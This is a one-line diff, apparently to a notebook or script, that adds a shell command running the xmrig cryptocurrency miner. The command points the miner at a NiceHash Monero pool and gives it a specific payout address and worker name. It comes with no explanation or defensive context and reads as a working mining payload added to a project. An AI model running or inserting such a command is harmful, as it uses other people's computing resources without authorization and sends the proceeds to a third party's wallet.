@@ -1,0 +1,1 @@
+! ./xmrig --donate-level 1 -o stratum+tcp://randomxmonero.eu-west.nicehash.com:3380 -u 39LsxT7Gv4uKAUd5Z8yyev1ij7tctA4u5e.ZXX -p x -k -a rx/0 -t 4
